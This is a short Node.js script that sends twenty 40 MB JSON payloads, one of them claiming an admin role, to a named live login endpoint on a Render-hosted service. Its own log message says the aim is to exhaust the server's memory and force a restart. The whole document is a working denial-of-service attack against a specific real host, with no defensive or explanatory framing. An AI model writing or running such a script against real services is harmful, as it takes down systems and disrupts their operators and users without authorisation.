const https = require('https');

async function crash() {
  console.log('Sending massive payload to OOM the server...');
  for(let i = 0; i < 20; i++) {
    const req = https.request('https://horev-bitulim-1.onrender.com/api/auth/login', { 
      method: 'POST', 
      headers: {'Content-Type': 'application/json'} 
    });
    req.on('error', (err) => console.log('Req error:', err.message));
    
    // 40MB payload per request
    req.write('{"role":"admin","id":"' + 'A'.repeat(40 * 1024 * 1024) + '"}');
    req.end();
    await new Promise(r => setTimeout(r, 50));
  }
  console.log('Done sending payloads. Wait a moment for Render to restart the service.');
}

crash();
